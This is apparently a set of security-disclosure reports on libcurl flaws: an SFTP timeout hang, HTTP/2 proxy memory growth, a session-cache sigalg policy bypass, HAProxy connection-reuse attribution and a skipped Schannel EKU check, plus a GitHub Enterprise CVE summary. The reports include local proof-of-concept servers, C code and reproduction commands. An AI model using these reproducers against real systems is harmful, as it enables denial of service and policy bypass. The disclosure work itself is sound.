    print(f"[*] With a libssh2-built curl, it will exit with error 28 (CURLE_OPERATION_TIMEDOUT).")

    while True:
        try:
            client_sock, addr = sock.accept()
            print(f"[*] Connection from {addr}")
            t = threading.Thread(
                target=handle_client, args=(client_sock, host_key), daemon=True
            )
            t.start()
        except KeyboardInterrupt:
            print("\n[*] Shutting down.")
            break

    sock.close()


if __name__ == "__main__":
    main()
```

To reproduce, build curl with libssh support (it is not the default — the standard autotools and CMake builds do not enable it; `USE_LIBSSH` must be opted into explicitly with `--with-libssh`):

```
sudo apt-get install libssh-dev
autoreconf -fi
./configure --with-libssh --without-libssh2 --with-openssl \
            --disable-shared --enable-debug --enable-maintainer-mode
make -j$(nproc)
./src/curl --version | grep -i libssh
```

Generate a throwaway host key, start the stalling server, and trigger:

```
pip install paramiko
python3 -c "
from paramiko import RSAKey
k = RSAKey.generate(2048)
k.write_private_key_file('/tmp/f29_host_rsa')
"
python3 F29_server.py &
time ./src/curl --max-time 3 -v -o /dev/null --insecure \
    sftp://user:pass@127.0.0.1:2222/file
```

Curl invocation:

```
curl --max-time 3 -v sftp://user:pass@127.0.0.1:2222/file
```

Expected (with libssh-built curl): returns error 28 (`CURLE_OPERATION_TIMEDOUT`) after 3 seconds.

Actual (with libssh-built curl): hangs indefinitely past 3 seconds; must be killed externally.

With the libssh build curl prints "Initializing SFTP session" and then hangs. The `time` wrapper will show wall-clock time growing well past 3 seconds with no timeout error; the process must be killed with Ctrl-C. With a libssh2 build the same command exits in approximately 3 seconds with:

```
curl: (28) Operation timed out after 3001 milliseconds
```

Exit code 28 (`CURLE_OPERATION_TIMEDOUT`).

Two complementary fixes. The minimal safe one is setting `SSH_OPTIONS_TIMEOUT` in the session setup block (around line 2548) so that libssh itself enforces the transfer deadline:

```c
long timeout_ms = (long)Curl_timeleft_ms(data);
if(timeout_ms > 0) {
  long timeout_s = (timeout_ms + 999) / 1000;  /* round up */
  ssh_options_set(sshc->ssh_session, SSH_OPTIONS_TIMEOUT, &timeout_s);
}
```

The cleaner long-term fix is removing `ssh_set_blocking(…, 1)` from `myssh_in_SFTP_INIT` entirely and letting the non-blocking session return `SSH_AGAIN` so that `myssh_block_statemach` can loop back and check `Curl_timeleft_ms` — the same pattern libssh2 already uses. The same `ssh_set_blocking(…, 1)` pattern appears at lines 1784 and 2163 of the same file and is worth reviewing for the same reason.

Thank you,
AISLE Research Team

## Impact

A malicious or stalled SFTP server can cause libcurl builds that use the libssh backend to ignore CURLOPT_TIMEOUT and --max-time during SFTP subsystem setup, leaving the process hung indefinitely until it is killed externally. The impact is denial of service and resource exhaustion rather than memory corruption, and it is limited to non-default curl builds that were explicitly compiled with libssh support.

summaries.author: skum-gh
summaries.content:
An authorization bypass vulnerability was identified in GitHub Enterprise Server that allowed an attacker with admin access on one repository to modify the secret scanning push protection delegated bypass reviewer list on another repository by manipulating the owner_id parameter in the request body. Authorization was verified against the repository in the URL, but the action was applied to a different repository specified in the request body. The impact is limited to assigning existing trusted users as bypass reviewers; it does not allow adding arbitrary external users. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.21 and was fixed in versions 3.14.25, 3.15.20, 3.16.16, 3.17.13, 3.18.7, 3.19.4 and 3.20.1. This vulnerability was reported via the GitHub Bug Bounty program.

[CVE-2026-3307](https://nvd.nist.gov/vuln/detail/CVE-2026-3307)

title: HTTP/2 proxy CONNECT tunnel unbounded 1xx chain (missing Curl_bump_headersize cap in cf-h2-proxy.c)

weakness.name: Allocation of Resources Without Limits or Throttling

vulnerability_information:
A malicious HTTPS-on-HTTP/2 proxy can grow a libcurl client's resident set without bound during the CONNECT phase by streaming 1xx informational responses. The CVE-2023-38039 cap (`MAX_HTTP_RESP_HEADER_SIZE`, 300 KiB, enforced through `Curl_bump_headersize`) is not applied on the HTTP/2 proxy path. The HTTP/2 proxy filter was introduced in commit `4ae2d9f24d` (2023-04-06, "proxy: http2 proxy tunnel implementation") and the `:status` → new-`http_resp` → `prev`-chain pattern with no depth cap has been there since.

The short version: every `:status` pseudo-header on the proxy CONNECT stream goes through `proxy_h2_on_header` (`lib/cf-h2-proxy.c:558-577`), which allocates a fresh `struct http_resp` per status and chains it via `resp->prev`. The tunnel state machine only considers the CONNECT response "final" when it sees a non-1xx status (`lib/cf-h2-proxy.c:506-509`), so a peer that streams 1xx forever keeps the accumulator alive forever. There is no chain-depth cap, and `Curl_bump_headersize` is never called from `cf-h2-proxy.c`.

`Curl_http_resp_make` (`lib/http.c:4973-4998`) init's both `headers` and `trailers` `dynhds` with `DYN_HTTP_REQUEST` = 1 MiB. That's a per-entry ceiling — it does not chain. An attacker that fills each entry just under the per-`dynhds` byte cap and then sends a fresh `:status` to start a new `http_resp` gets ~1 MiB per chain link, no upper bound. Even the bare-`:status` spammer mode allocates ~1.4 KiB per frame against ~3-5 bytes on the wire (compressed HPACK), so roughly 1000× amplification.

Reproducer setup:

```sh
openssl req -x509 -newkey rsa:2048 -keyout /tmp/proxy.key -out /tmp/proxy.crt -days 1 -nodes -subj "/CN=localhost" 2>/dev/null && pip3 install --quiet --break-system-packages h2
```

...

```shell
$ BURST=50000 bash poc.sh
```

SSL session-cache peer key omits signature_algorithms: strict-sigalg handle silently resumes a permissive sibling's session
vulnerability_information:
# `CURLOPT_SSL_SIGNATURE_ALGORITHMS` policy bypass: SSL session cache key omits sigalgs, allowing a strict-sigalg handle to resume a session negotiated under a permissive policy

## AI disclosure

This report was prepared with the assistance of an AI coding assistant
(Claude). The behavioral diff (pre/post patch) reproduces
deterministically on a real OpenSSL-backed curl build against
`openssl s_server`; full verbose logs are attached. Code-reading
claims have been double-checked against the source at the commit
listed below (`vtls.c` matcher vs. `vtls_scache.c` peer-key builder).
This vulnerability class has a direct precedent in CVE-2020-8231
(where the same asymmetry existed between the connection-cache
matcher and the peer-key builder for a different field).

## Affected versions

Introduced in commit `a638828c88` ("TLS: add
CURLOPT_SSL_SIGNATURE_ALGORITHMS and --sigalgs", Andrei Florea,
2025-04-02) — the option's introducing commit added sigalgs to
`match_ssl_primary_config` and the clone path, but not to
`Curl_ssl_peer_key_make` (the session-cache key builder).
First affected release: **curl 8.14.0** (`git describe
--tags --contains a638828c88` → `curl-8_14_0~167`). Affected
through **curl 8.20.0** (current latest released) and master
(`curl-8_20_0-78-ga32a2b0b77`, `LIBCURL_VERSION "8.21.0-DEV"`).
Confirmed on master built with
`--with-openssl=/opt/homebrew/opt/openssl@3`. The patch applies
cleanly to all of them.

## Summary

`Curl_ssl_peer_key_make` (`lib/vtls/vtls_scache.c`) builds the cache
key used to look up cached SSL sessions for reuse. It includes fields
like `cipher_list13` and `curves`, but **omits**
`signature_algorithms`. Meanwhile, `match_ssl_primary_config`
(`lib/vtls/vtls.c:219`) **does** compare `signature_algorithms` when
deciding whether two SSL primary configs match.

The result: two `CURL` handles that differ only in
`CURLOPT_SSL_SIGNATURE_ALGORITHMS` produce **identical peer cache
keys**. If they share an SSL session cache (via `CURLSH` with
`CURL_LOCK_DATA_SSL_SESSION`), a handle with a **strict** sigalg
policy can resume a session that was negotiated under a **permissive**
policy on a sibling handle — silently bypassing its own stricter
policy: the resumed handshake does not present a certificate, so the
sigalg constraint (which is applied during certificate validation)
never runs.

This is the same defect class as CVE-2020-8231 (peer-cache-key omits
a field the matcher uses).

## Source-level evidence (pre-patch)

`lib/vtls/vtls_scache.c`, `Curl_ssl_peer_key_make`:

```c
  if(ssl->cipher_list13) {
    r = curlx_dyn_addf(&buf, ":CIPHER13-%s", ssl->cipher_list13);
    if(r) goto out;
  }
  if(ssl->curves) {
    r = curlx_dyn_addf(&buf, ":CURVES-%s", ssl->curves);
    if(r) goto out;
  }
  /* <-- signature_algorithms NOT added to peer key */
  if(ssl->verifypeer) {
    …
  }
```

`lib/vtls/vtls.c:194-225`, `match_ssl_primary_config` (the predicate
used by the connection-reuse decision):

```c
static bool match_ssl_primary_config(struct Curl_easy *data,
                                     struct ssl_primary_config *c1,
                                     struct ssl_primary_config *c2)
{
  (void)data;
  if((c1->version == c2->version) &&
     (c1->version_max == c2->version_max) &&
     (c1->ssl_options == c2->ssl_options) &&
     (c1->verifypeer == c2->verifypeer) &&
     (c1->verifyhost == c2->verifyhost) &&
     (c1->verifystatus == c2->verifystatus) &&
     blobcmp(c1->cert_blob, c2->cert_blob) &&
     blobcmp(c1->ca_info_blob, c2->ca_info_blob) &&
     blobcmp(c1->issuercert_blob, c2->issuercert_blob) &&
     Curl_safecmp(c1->CApath, c2->CApath) &&
     Curl_safecmp(c1->CAfile, c2->CAfile) &&
     Curl_safecmp(c1->issuercert, c2->issuercert) &&
     Curl_safecmp(c1->clientcert, c2->clientcert) &&
#ifdef USE_TLS_SRP
     !Curl_timestrcmp(c1->username, c2->username) &&
     !Curl_timestrcmp(c1->password, c2->password) &&
#endif
     curl_strequal(c1->cipher_list, c2->cipher_list) &&
     curl_strequal(c1->cipher_list13, c2->cipher_list13) &&
     curl_strequal(c1->curves, c2->curves) &&
     curl_strequal(c1->signature_algorithms,        /* line 219 */
                   c2->signature_algorithms) &&
     curl_strequal(c1->CRLfile, c2->CRLfile) &&
     curl_strequal(c1->pinned_key, c2->pinned_key))
    return TRUE;

  return FALSE;
}
```

The asymmetry: the connection-reuse matcher considers
`signature_algorithms` (line 219, `curl_strequal`), but the session-
cache key builder does not (no `:SIGALGS-` line in
`Curl_ssl_peer_key_make`). Two handles with the same host/port/CA but
different sigalgs therefore agree on cache-key equality (wrong) while
disagreeing on connection-config equivalence (correct). The session-
cache becomes the weak link.

## Reproduction

Build curl with OpenSSL backend (any backend that implements
`CURLOPT_SSL_SIGNATURE_ALGORITHMS`):

```
./configure --with-openssl=<path> --enable-debug --enable-curldebug
make
```

Test cert (server, signed with ECDSA+SHA256):

```
openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 \
  -keyout key.pem -out cert.pem -days 1 -nodes -subj "/CN=localhost"
```

Run a TLS 1.3 server that supports session tickets:

```
openssl s_server -accept 14443 -cert cert.pem -key key.pem -tls1_3 -www -quiet
```

PoC (single C file, ~80 lines, attached as `poc_sigalgs_bypass.c`):

```c
CURLSH *sh = curl_share_init();
curl_share_setopt(sh, CURLSHOPT_SHARE, CURL_LOCK_DATA_SSL_SESSION);

CURL *easy = curl_easy_init();

/* Handle A: permissive sigalgs (includes ECDSA+SHA256 which the
   server's cert can satisfy). Populates the session cache. */
curl_easy_setopt(easy, CURLOPT_URL, "https://localhost:14443/");
curl_easy_setopt(easy, CURLOPT_SHARE, sh);
curl_easy_setopt(easy, CURLOPT_SSL_VERIFYPEER, 0L);
curl_easy_setopt(easy, CURLOPT_SSL_VERIFYHOST, 0L);
curl_easy_setopt(easy, CURLOPT_SSL_SIGNATURE_ALGORITHMS,
                 "ECDSA+SHA1:ECDSA+SHA256");
curl_easy_perform(easy);   /* succeeds, caches session under permissive */

/* Handle B: strict sigalgs (only ECDSA+SHA384). The server cert is
   ECDSA+SHA256 — under B's stated policy, the handshake MUST fail. */
curl_easy_reset(easy);
curl_easy_setopt(easy, CURLOPT_URL, "https://localhost:14443/");
curl_easy_setopt(easy, CURLOPT_SHARE, sh);
curl_easy_setopt(easy, CURLOPT_SSL_VERIFYPEER, 0L);
curl_easy_setopt(easy, CURLOPT_SSL_VERIFYHOST, 0L);
curl_easy_setopt(easy, CURLOPT_SSL_SIGNATURE_ALGORITHMS, "ECDSA+SHA384");
CURLcode rc = curl_easy_perform(easy);
printf("B rc=%d (%s)\n", rc, curl_easy_strerror(rc));
```

## Observed behavior

**Pre-patch (vulnerable):**

```
=== A_permissive: sigalgs="ECDSA+SHA1:ECDSA+SHA256" ===
SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / X25519MLKEM768 / id-ecPublicKey
    A_permissive rc=0
=== B_strict: sigalgs="ECDSA+SHA384" ===
SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / X25519MLKEM768 / UNDEF
    B_strict rc=0   <-- SHOULD HAVE FAILED
```

`B_strict` connects successfully despite the server cert being signed
with ECDSA+SHA256 (which B's policy excludes). The `UNDEF` curve in
the second connection is the TLS 1.3 resumption marker — no fresh
key exchange occurred. B reused A's session, so B's stricter
sigalg policy never got a chance to reject the cert.

**Post-patch (with `:SIGALGS-` added to peer key):**

```
=== A_permissive: sigalgs="ECDSA+SHA1:ECDSA+SHA256" ===
    A_permissive rc=0
=== B_strict: sigalgs="ECDSA+SHA384" ===
    B_strict rc=35 (SSL connect error)   <-- correctly enforced
```

`B_strict` no longer finds A's session in the cache (different peer
key), does a fresh handshake under its own policy, and the server's
ECDSA+SHA256 cert is correctly rejected.

## Impact

- **Policy bypass:** any application that uses
  `CURLOPT_SSL_SIGNATURE_ALGORITHMS` for tiered authentication
  (e.g., stricter sigalgs for high-value endpoints, more permissive
  for legacy/internal) and shares an SSL session cache across handles
  silently inherits the weakest policy ever used against the host.
- **TLS 1.3 verified, TLS 1.2 plausibly equivalent:** TLS 1.3
  resumption is PSK-based and skips the Certificate message
  entirely (verified empirically here, see the `UNDEF` curve marker
  in the pre-fix verbose log). TLS 1.2 abbreviated handshakes
  (both session-ID and ticket-based) likewise omit Certificate;
  the same bypass shape applies but has not been verified
  empirically in this report.
- **No memory safety, no cryptographic break.** This is a policy-
  laundering bug, identical in class to CVE-2020-8231 (which had a
  CVE assigned for the analogous case in another field).
- **Real-world reach:** narrow but unsympathetic. Applications
  that set `CURLOPT_SSL_SIGNATURE_ALGORITHMS` per handle are by
  definition applications that want differentiated sigalg
  enforcement — the exact use case this defect undoes. Common
  pattern: PQ-ready or non-SHA1 policy on high-value endpoints,
  legacy on internal services. Either tier of caller, when sharing
  an SSL session cache with a more-permissive sibling, inherits
  the weaker policy silently.

## Suggested fix

`lib/vtls/vtls_scache.c`, inside `Curl_ssl_peer_key_make`, add the
`signature_algorithms` field to the peer key alongside the other
ssl-config fields:

```diff
   if(ssl->curves) {
     r = curlx_dyn_addf(&buf, ":CURVES-%s", ssl->curves);
     if(r)
       goto out;
   }
+  /* signature_algorithms must be part of the peer key: the connection
+     cache matcher (match_ssl_primary_config) compares this field, so
+     two handles differing only in CURLOPT_SSL_SIGNATURE_ALGORITHMS
+     must not share a cached session. Without this, the stricter
+     handle inherits the permissive handle's negotiated session,
+     bypassing its policy. */
+  if(ssl->signature_algorithms) {
+    r = curlx_dyn_addf(&buf, ":SIGALGS-%s", ssl->signature_algorithms);
+    if(r)
+      goto out;
+  }
   if(ssl->verifypeer) {
     …
```

After applying, the e2e test in this report flips from `B rc=0` to
`B rc=35` (correct policy enforcement).

## Attachments

- `poc_sigalgs_bypass.c` — single-file libcurl PoC (~80 lines)
- `verbose-pre-patch.txt` — full curl verbose log, pre-fix run
  (B succeeds with `UNDEF` curve TLS 1.3 resumption marker)
- `verbose-post-patch.txt` — full curl verbose log, post-fix run
  (B fails rc=35 SSL connect error)
- `suggested-patch.diff` — unified diff adding `:SIGALGS-%s` to
  `Curl_ssl_peer_key_make`

## Impact

Applications that use CURLOPT_SSL_SIGNATURE_ALGORITHMS for tiered authentication (stricter sigalgs for high-value endpoints, more permissive for legacy/internal) and share an SSL session cache silently inherit the weakest policy ever used against a given host. Verified empirically on TLS 1.3 (PSK resumption, no Certificate message — UNDEF curve marker in the attached log). TLS 1.2 abbreviated handshakes (session-ID and ticket) also omit Certificate,  so the same bypass shape applies but was not verified empirically here. No memory-safety impact; this is policy laundering via the session cache.

title: Connection reuse ignores haproxyprotocol and HAPROXY_CLIENT_IP settings, allowing PROXY context to persist across transfers
vulnerability_information:
## Summary:

libcurl's connection pool match logic does not include the
CURLOPT_HAPROXYPROTOCOL setting or the CURLOPT_HAPROXY_CLIENT_IP
value in its connection match key. Two transfers issued through the
same `Curl_easy` or via a shared connection cache
(`CURL_LOCK_DATA_CONNECT`) therefore share one TCP connection even
when their PROXY protocol settings differ. The HAProxy PROXY header
is sent only once at connect time (`cf-haproxy.c` HAPROXY_INIT →
HAPROXY_SEND → HAPROXY_DONE state machine); once the filter is
HAPROXY_DONE on a cached connection, no subsequent transfer on that
connection re-issues the header. A later transfer that did not
request the PROXY header, or that requested a different spoofed
client IP, is still attributed by the backend to the address
advertised in the first transfer.

This is one missing connection-match gate producing two
manifestations on the same defect:

- Vector A: PROXY attribution from one transfer is silently
  inherited by subsequent transfers that did not request it.
- Vector B: A new spoofed client IP requested by a later transfer
  is silently dropped because the PROXY header is not re-sent on
  the reused connection.

The two vectors are one finding at one severity tier — I do not
sum them. Same architectural shape as the 2026 connection-reuse
CVE family (CVE-2026-4873 TLS requirement; CVE-2026-5545 HTTP
Negotiate auth identity; CVE-2026-5773 SMB share; CVE-2026-6429
netrc credentials; CVE-2026-6253 proxy credentials across redirect;
CVE-2026-7168 cross-proxy Digest auth state; CVE-2026-3784 proxy
credentials in CONNECT reuse): a connection-level setting controls
filter chain composition or connection identity but is not
snapshotted on the connectdata for comparison at reuse time.
HAPROXYPROTOCOL is the unfixed member of that family.

Verified by:

- `grep -n haproxyprotocol lib/url.c` on master returns zero
  matches (no reference in the connection match orchestration).
- L1 reproduction in docker against curl 8.21.0-DEV (built from
  master HEAD on 2026-05-17) with an HAProxy 3.2.19 `accept-proxy`
  listener and a Python `http.server` backend; four transfers via
  two easy handles sharing CURL_LOCK_DATA_CONNECT; all four reuse
  a single TCP connection (HAProxy frontend-counter `fc=1`); the
  HAProxy log column `attributed_src=1.2.3.4` is preserved across
  transfers, including the ones that requested no PROXY context
  and the one that requested a different spoofed IP.

## Affected version

Verified on master HEAD as of 2026-05-17 (curl 8.21.0-DEV). The
relevant code paths are unchanged in the 8.20.0 release and have
been present since `CURLOPT_HAPROXYPROTOCOL` was introduced.

Test build `curl -V` output:

```
curl 8.21.0-DEV (aarch64-unknown-linux-gnu) libcurl/8.21.0-DEV OpenSSL/3.0.20 zlib/1.2.13 libidn2/2.3.3 libpsl/0.21.2 nghttp2/1.52.0
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS Debug HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz PSL SSL threadsafe TLS-SRP UnixSockets
```

Build environment: `debian:bookworm-slim` container; deps
`build-essential autoconf automake libtool pkg-config libssl-dev
libnghttp2-dev zlib1g-dev libidn2-dev libpsl-dev`; configured with
`--with-openssl --with-nghttp2 --with-libpsl --enable-debug
--disable-shared`.

## Steps To Reproduce:

The attached files set up a self-contained reproducible PoC. All
commands assume the attached tarball is extracted into a working
directory.

1. Build a debug curl from master HEAD inside a container (see
   `README.md` for the exact one-line `docker run` command;
   produces `build-output/install/bin/curl` and
   `build-output/install/lib/libcurl.a`).

2. Bring up the HAProxy `accept-proxy` listener + Python
   `http.server` backend:

   ```
   cd pocs/haproxy-bypass
   docker compose up -d
   ```

3. Compile the attached `poc.c` against the debug libcurl and run
   it on the compose network (full command in `README.md`):

   ```
   docker run --rm --network haproxy-bypass_poc_net \
       -v "$(pwd)/build-output:/build" \
       -v "$(pwd)/pocs/haproxy-bypass:/poc" \
       -w /poc debian:bookworm-slim sh -c \
       'apt-get update >/dev/null && apt-get install -y --no-install-recommends \
          gcc libc6-dev libssl-dev libnghttp2-dev zlib1g-dev libidn2-dev libpsl-dev \
          libssl3 libnghttp2-14 libidn2-0 libpsl5 zlib1g >/dev/null && \
        gcc -Wall -O0 -g -o /poc/poc /poc/poc.c \
          -I/build/install/include -L/build/install/lib \
          -lcurl -lssl -lcrypto -lnghttp2 -lz -lidn2 -lpsl -lpthread && \
        LD_LIBRARY_PATH=/build/install/lib /poc/poc http://haproxy:3128/test'
   ```

4. Inspect HAProxy logs:

   ```
   docker compose logs haproxy --tail=10
   ```

Expected output (← THIS IS WHERE THE BUG FIRES) — attached
verbatim in `evidence/haproxy.log`:

```
tag=A attributed_src=1.2.3.4 fc=1 req=GET /test
tag=B attributed_src=1.2.3.4 fc=1 req=GET /test
tag=C attributed_src=1.2.3.4 fc=1 req=GET /test
tag=D attributed_src=1.2.3.4 fc=1 req=GET /test
```

The four transfer tags correspond to:

- A: `CURLOPT_HAPROXYPROTOCOL=1`, `CURLOPT_HAPROXY_CLIENT_IP="1.2.3.4"`
- B: `CURLOPT_HAPROXYPROTOCOL=0`
- C: `CURLOPT_HAPROXYPROTOCOL=1`, `CURLOPT_HAPROXY_CLIENT_IP="9.8.7.6"`
- D: `CURLOPT_HAPROXYPROTOCOL=0`

Frontend connection counter `fc=1` for all four transfers
demonstrates a single TCP connection is reused. Backend log
(attached `evidence/backend.log`) shows the same backend peer port
`46398` for all four transfers, confirming TCP-level reuse. The
libcurl wire trace (attached `evidence/curl-wire-trace.txt`) shows
`Connection #0 to host haproxy:3128 left intact` after each
transfer. The HAProxy `attributed_src` column is `1.2.3.4` for all
four transfers, including:

- Transfer B, which sent no PROXY header — backend attributes it
  to A's spoofed IP.
- Transfer C, which requested a different spoofed IP (`9.8.7.6`) —
  the PROXY header is not re-sent because the filter is in
  HAPROXY_DONE state on the cached connection; backend continues
  to attribute to `1.2.3.4`.

## Related code (verbatim references on master HEAD)

- `lib/urldata.h` struct UserDefined: `BIT(haproxyprotocol)`,
  `STRING_HAPROXY_CLIENT_IP`.
- `lib/connect.c:429`: filter chain insertion gated on
  `data->set.haproxyprotocol` at connection setup.
- `lib/cf-haproxy.c`: PROXY header is sent once when the filter
  transitions through HAPROXY_INIT → HAPROXY_SEND → HAPROXY_DONE,
  never re-sent on reused connections.
- `lib/url.c::url_match_connect_config()` (around line 694) and
  `lib/url.c::url_match_conn()` (around line 1129): connection
  match orchestration. Neither references `haproxyprotocol` nor
  `STRING_HAPROXY_CLIENT_IP`.

## Architectural pattern — this is the unfixed member of the 2026 connection-reuse family

Across the recent 2026 connection-reuse CVE family in curl, fixes
share one structural pattern: snapshot the connection-level
setting on `connectdata` at allocate time and compare in the match
function. (CVE-2026-3805 is excluded from this table because it is
a memory-safety bug — use-after-free — triggered by SMB connection
reuse, not a missing-match-key bug.)

| Fixed in | Missing match field | Patch idiom |
|----------|---------------------|-------------|
| CVE-2026-3784 | Proxy credentials in CONNECT reuse | Add credentials compare in match |
| CVE-2026-4873 | TLS requirement on reuse | Add TLS-requirement compare in match |
| CVE-2026-5545 | HTTP Negotiate auth identity | Add credential-identity compare in match |
| CVE-2026-5773 | SMB share identifier | Disable SMB connection reuse entirely |
| CVE-2026-6253 | Proxy credentials across redirect-to-proxy | Add scope compare in match |
| CVE-2026-6429 | netrc credentials with reused proxy | Add host-scope compare in match |
| CVE-2026-7168 | Cross-proxy Digest auth state | Reset auth state on proxy change |
| **(this report)** | **CURLOPT_HAPROXYPROTOCOL + CURLOPT_HAPROXY_CLIENT_IP** | **Same idiom — add compare in match** |

Seven family members already share the same fix idiom;
HAPROXYPROTOCOL is the unfixed member. The defect surface is
internally consistent: one connection-level user setting whose
value controls filter-chain composition or connection identity,
omitted from the match function.

## Severity stance

I do not assign a severity tier and defer to the curl security
team. For reference, CVE-2026-4873 (TLS requirement ignored on
reuse — closest structural sibling) was rated Low. I explicitly do
NOT claim High or Critical, and I do NOT sum Vector A and Vector B
into a higher tier — the two manifestations stem from one missing
match gate on one decision site (the connection match
orchestrator in `lib/url.c`) and are packaged as one finding at
one tier.

## Again: there is no bug-bounty for curl. We do not offer any rewards, only proper credits.

## Impact

## Summary:

Where an application reuses libcurl connections across transfers
with different HAProxy PROXY protocol settings (via the
`CURL_LOCK_DATA_CONNECT` share interface or the default per-handle
connection pool), the backend observes PROXY context from the
first transfer applied to subsequent transfers. Where the backend
treats the PROXY-derived source address as a security boundary,
two distinct abnormal states result:

1. A spoofed source IP from one transfer is silently inherited by
   later transfers that did not request PROXY spoofing at all. If
   the backend uses the PROXY-derived source IP for IAM policy
   decisions (for example AWS IAM `aws:SourceIp` condition keys),
   WAF IP rules, per-IP rate-limit buckets, or audit-log
   correlation, those later transfers operate under a different
   attribution than the caller requested.

2. A new spoofed source IP requested by a later transfer is
   silently dropped — the PROXY header is not re-sent on a reused
   connection, so the backend continues to see the earlier IP.
   The caller's intent to change attribution is lost without any
   surfacing error from libcurl.

## Who can exploit

Any caller within a process that shares a libcurl connection pool
across PROXY-protocol settings. This is the normal operating mode
in deployments where one process embeds libcurl on behalf of
multiple callers — API gateways, embedded proxy libraries,
Kubernetes sidecar HTTP clients, serverless function wrappers,
CI/CD runner agents. In single-tenant CLI use the precondition is
unusual; the realistic attack surface is multi-tenant or
multi-context library embedding.

## Affected population

Any libcurl-using application that both (a) issues some transfers
with `--haproxy-protocol` / `CURLOPT_HAPROXYPROTOCOL=1`, and (b)
issues other transfers without it (or with a different
`CURLOPT_HAPROXY_CLIENT_IP`), and reuses the connection pool
across them. HAProxy v1 PROXY protocol client support has been in
libcurl since `CURLOPT_HAPROXYPROTOCOL` was introduced; the
connection-reuse field-mismatch path has been the source of seven
fixed 2026 CVEs in curl 8.19.0 and 8.20.0 (see Description for
the precedent table), and this is one more instance.

## Persistence

The cached connection holds the first transfer's PROXY context
for the lifetime of the connection (HTTP keep-alive idle timeout,
typically 60–300 seconds in deployment). The next transfer that
pays the cost of opening a new TCP connection clears the state;
until then, every subsequent transfer on that socket inherits the
first transfer's attribution.

## Detectability

No client-side error or warning is surfaced. The PROXY header
simply is not re-sent; the backend cannot distinguish
"intentional re-use of attribution" from "PROXY context silently
inherited from a previous transfer". Audit detectability depends
on the backend's per-transfer logging granularity and on whether
the backend logs the resolved source IP per request.

## Severity floor (empirically anchored, not hedged)

I defer to the curl security team for severity assignment. Recent
connection-reuse field-mismatch bugs in this family have
historically been rated in the Low–Medium range by the curl team
(see Description for the seven 2026 precedents). I have not
collected evidence of an end-to-end production exploit chain (IAM
bypass against a live AWS account, WAF rate-limit bypass against
a live deployment) and do not assert such evidence; the report
rests on the structural defect plus the empirical reproduction of
attribution preservation across transfer boundaries.

title: Schannel custom-CA path skips Extended Key Usage enforcement
vulnerability_information:
Hi all,

We believe the Schannel custom-CA verification path in `lib/vtls/schannel_verify.c` may skip Extended Key Usage enforcement. In particular, a certificate that chains to the trusted custom CA but contains only `id-kp-clientAuth`, rather than `id-kp-serverAuth`, may pass peer verification on Windows when curl is used with `CURLOPT_CAINFO` or `CURLOPT_CAINFO_BLOB` set.

Note: We have not actually tested this on a Windows machine (due to lack of ability), so this report is currently based on source review and Win32 API documentation.

The relevant code is in `Curl_verify_certificate()`. It allocates a `CERT_CHAIN_PARA`, zeroes it, sets only `cbSize`, and passes it to `CertGetCertificateChain`:

```c
CERT_CHAIN_PARA ChainPara;

memset(&ChainPara, 0, sizeof(ChainPara));
ChainPara.cbSize = sizeof(ChainPara);

if(!CertGetCertificateChain(cert_chain_engine,
                            pCertContextServer,
                            NULL,
                            pCertContextServer->hCertStore,
                            &ChainPara,
                            (ssl_config->no_revoke ? 0 :
                             CERT_CHAIN_REVOCATION_CHECK_CHAIN),
                            NULL,
                            &pChainContext)) {
```

Because `RequestedUsage` is left unset, chain building appears to run without an EKU constraint. Microsoft documents that server/client authorization distinctions should be expressed through the `RequestedUsage` member passed to `CertGetCertificateChain`, and then enforced with `CertVerifyCertificateChainPolicy` as appropriate. In the current Schannel verification path, we do not see either `RequestedUsage` populated for `serverAuth` or a subsequent `CertVerifyCertificateChainPolicy(CERT_CHAIN_POLICY_SSL, ...)` call. As a result, Windows may have no reason to set `CERT_TRUST_IS_NOT_VALID_FOR_USAGE` for a leaf that lacks `id-kp-serverAuth`.

This also explains why the existing trust-mask logic does not help. The mask does not suppress `CERT_TRUST_IS_NOT_VALID_FOR_USAGE` (`0x10`), so if Windows set that bit, curl would already fail correctly. The issue seems to be that this path never asks Windows to evaluate server-auth EKU in the first place.

The affected path is entered when `CURLOPT_CAINFO` or `CURLOPT_CAINFO_BLOB` is supplied on Windows 7 or later, which sets `backend->use_manual_cred_validation = TRUE` in `schannel.c`. If `CURLOPT_SSL_VERIFYPEER` is enabled, curl then dispatches to `Curl_verify_certificate()`. When no custom CA is provided, curl stays on Schannel's native validation path instead. That distinction matters because the issue appears specific to the manual custom-CA detour.

The practical consequence is a possible MitM in environments where an attacker can obtain a certificate for the target hostname from a CA that is present in the victim's custom CA bundle, but where that certificate is not valid for server authentication. This does not appear to be exploitable with a self-signed certificate. The main risk seems to be private PKI environments, such as enterprise, IoT, or embedded deployments, where non-server certificates may be issued more broadly.

Below is a reproducer. The certificate-generation steps are cross-platform with OpenSSL. The curl step is Windows-only, and the expected result is still a prediction based on source analysis and Microsoft API behavior.

Step 1: generate a CA and issue a certificate for `server.example.com` with only `id-kp-clientAuth` and no `id-kp-serverAuth`:

```sh
# CA key and self-signed certificate
openssl genrsa -out ca.key 2048
openssl req -new -x509 -days 3650 -key ca.key -out ca.pem \
    -subj "/CN=Test CA"

# Server key and CSR
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr \
    -subj "/CN=server.example.com"

# Extension file: SAN + clientAuth EKU only
cat > server_exts.cnf << 'EOF'
subjectAltName   = DNS:server.example.com
extendedKeyUsage = clientAuth
EOF

# Sign the server cert with the CA
openssl x509 -req -days 365 -in server.csr \
    -CA ca.pem -CAkey ca.key -CAcreateserial \
    -extfile server_exts.cnf \
    -out server.pem

# Confirm: should show clientAuth and not serverAuth
openssl x509 -in server.pem -noout -text | grep -A3 "Extended Key"
```

Step 2: on Windows, serve `server.pem` and `server.key` from any TLS server, add a hosts-file entry for `server.example.com`, then run:

```bat
curl --cacert ca.pem https://server.example.com/
```

Expected behavior: curl should reject the connection with an error such as `(60) SSL certificate problem: certificate is not valid for the requested usage`.

